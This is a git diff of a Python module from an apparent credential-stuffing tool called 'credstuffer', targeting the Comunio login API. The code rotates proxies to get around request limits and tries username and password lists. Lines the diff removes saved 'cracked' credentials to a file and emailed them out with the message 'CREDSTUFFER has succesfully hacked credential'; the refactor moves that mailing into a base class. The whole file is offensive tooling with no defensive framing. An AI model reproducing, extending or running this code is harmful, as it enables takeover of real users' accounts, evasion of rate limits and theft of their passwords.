@@ -3,8 +3,6 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from credstuffer import UserAccount
-from credstuffer import ROOT_DIR
-from credstuffer.messenger import Mail, Telegram
 from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError
 
 
@@ -20,13 +18,11 @@ class Comunio(UserAccount):
     def __init__(self, max_requests=10000, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Comunio')
+        self.name = 'Comunio'
 
         # init base class
-        super().__init__()
+        super().__init__(name=self.name, notify=notify, SMTP=SMTP, PORT=PORT, SENDER=SENDER, RECEIVER=RECEIVER, PASSWORD=PASSWORD)
 
-        self.name = 'Comunio'
-        self.credential_file = self.file_cracked + '_' + self.name
-        self.notify = notify
         self.headers.update({
             'Origin': 'http://www.comunio.de',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -35,14 +31,6 @@ class Comunio(UserAccount):
         self.comunio_login_url = 'https://api.comunio.de/login'
         self.max_requests = max_requests
         self.request_counter = 0
-        self.mail = None
-
-        if self.notify is not None:
-            if 'mail' in self.notify:
-                self.mail = Mail(smtp_server=SMTP, port=PORT, sender=SENDER, receiver=RECEIVER)
-                self.mail.login(username=SENDER, password=PASSWORD)
-        else:
-            self.logger.info("No credential notifyer configured")
 
     def set_usernames(self, usernames):
         """ sets usernames for comunio account
@@ -76,28 +64,11 @@ class Comunio(UserAccount):
 
             else:
                 # raise Error to renew Proxy
+                self.request_counter = 0
+                self.logger.error("Max number of proxy requests reached!. Renew Proxy")
                 raise ProxyMaxRequestError("Max number of proxy requests reached!")
         else:
             raise ProxyNotSetError("No Proxy was set!")
-
-    def notifyer(self, username, password):
-        """ saves and sends a notification in success case
-
-        :param username: string username
-        :param password: string password
-        """
-
-        with open(ROOT_DIR + '/' + self.credential_file + '.txt', 'a') as file:
-            self.logger.info("writing credential to file {}".format(self.credential_file))
-            file.write("username: {}, password: {}\n".format(username, password))
-
-        if self.mail is not None:
-            self.mail.set_subject("CREDSTUFFER: Credential Notification!")
-            mail_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: {}\nPassword: {}"\
-                            .format(self.name, username, password)
-            self.mail.set_body(mail_content)
-            self.logger.info("send credential mail: {}".format(mail_content))
-            self.mail.send()
 
     def __request_login(self, username, password):
         """ request login with an session object
@@ -122,13 +93,7 @@ class Comunio(UserAccount):
 
         """
         if isinstance(proxy, dict):
-            alive = self.is_proxy_alive(proxy=proxy)
-            if alive:
-                self.logger.info("set proxy to {}".format(proxy['http']))
-                self.session.proxies = proxy
-                return True
-            else:
-                raise ProxyBadConnectionError("Renew proxy due to bad connection!")
+            self.logger.info("set proxy to {}".format(proxy['http']))
+            self.session.proxies = proxy
         else:
             raise TypeError("proxy must be type of dictionary!")
-
